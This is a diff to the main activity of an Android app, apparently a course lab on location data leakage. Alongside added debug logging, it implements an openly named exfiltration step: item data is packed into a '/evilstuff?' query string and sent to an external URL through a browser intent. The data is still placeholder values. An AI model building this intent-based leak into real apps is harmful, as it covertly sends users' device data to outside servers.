@@ -2,12 +2,14 @@ package lbs.lab.maclocation;
 
 import android.annotation.SuppressLint;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Bundle;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.view.menu.MenuBuilder;
 import android.support.v7.widget.LinearLayoutManager;
 import android.support.v7.widget.RecyclerView;
 import android.support.v7.widget.helper.ItemTouchHelper;
+import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
@@ -67,6 +69,7 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
                 ItemTouchHelper.RIGHT) {
             @Override
             public boolean onMove(RecyclerView recyclerView, RecyclerView.ViewHolder viewHolder, RecyclerView.ViewHolder target) {
+                Log.d(TAG, "onMove called");
                 int from = viewHolder.getAdapterPosition();
                 int to = target.getAdapterPosition();
                 Collections.swap(mItemsData, from, to);
@@ -76,6 +79,7 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
 
             @Override
             public void onSwiped(RecyclerView.ViewHolder viewHolder, int direction) {
+                Log.d(TAG, "onSwiped called");
                 mItemsData.remove(viewHolder.getAdapterPosition());
                 mAdapter.notifyItemRemoved(viewHolder.getAdapterPosition());
                 updateEmptyMessageVisibility();
@@ -99,6 +103,7 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
      * or if the normal list of recordings should be shown.
      */
     private void updateEmptyMessageVisibility() {
+        Log.d(TAG, "updateEmptyMessageVisibility called");
         RelativeLayout emptyView = findViewById(R.id.emptyView);
         if (mItemsData.isEmpty()) {
             emptyView.setVisibility(View.VISIBLE);
@@ -110,6 +115,7 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
     @SuppressLint("RestrictedApi") // bug in support library
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
+        Log.d(TAG, "onCreateOptionsMenu called");
         getMenuInflater().inflate(R.menu.menu_main, menu);
         if (menu instanceof MenuBuilder) {
             MenuBuilder m = (MenuBuilder) menu;
@@ -120,6 +126,7 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
 
     @Override
     public boolean onOptionsItemSelected(MenuItem item) {
+        Log.d(TAG, "onOptionsItemSelected called with " + item.toString());
         // different actions will be taken based on what menu item is selected
         switch (item.getItemId()) {
             case R.id.action_clear: // clear the list in memory, but not the database
@@ -150,6 +157,7 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        Log.d(TAG, "onActivityResult called with result code " + resultCode);
         // this function gets called whenever a spawned Activity returns a result
         switch (requestCode) {
             // we only care about the requests we have defined
@@ -197,10 +205,12 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
      * This is an important part of the application!
      * How we read data from the system.
      * The function is called whenever the '+' button at the bottom right is clicked.
+     *
      * @param view - this is the button clicked.
      */
     public void addItem(View view) {
         // TODO
+        Log.d(TAG, "addItem called (TODO)");
         mItemsData.add(new Item("EXAMPLE", "EXAMPLE"));
         mAdapter.notifyDataSetChanged();
         updateEmptyMessageVisibility();
@@ -209,11 +219,22 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
     /**
      * This is also an important part of the application!
      * Defines how we exfiltrate the data.
+     *
      * @param url - this is the URL returned by ExfiltrateFragment.
      */
     @Override
     public void onYes(String url) {
-        // TODO
+        Log.d(TAG, "onYes called towards " + url);
+        StringBuilder getRequestContainingDataReadFromTheSystem = new StringBuilder("/evilstuff?");
+        // let's pretend we have some data here
+        for(Item item : mItemsData){
+            getRequestContainingDataReadFromTheSystem.append(item.getTitle())
+                    .append('=').append(item.getInfo()).append('&');
+        }
+        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url + getRequestContainingDataReadFromTheSystem.toString()));
+        if (intent.resolveActivity(getPackageManager()) != null) {// lol no idea what this if is about
+            startActivity(intent);
+        }
     }
 
     /**
@@ -221,6 +242,7 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
      */
     @Override
     public void onNo() {
+        Log.d(TAG, "onNo called");
         return;
     }
 }
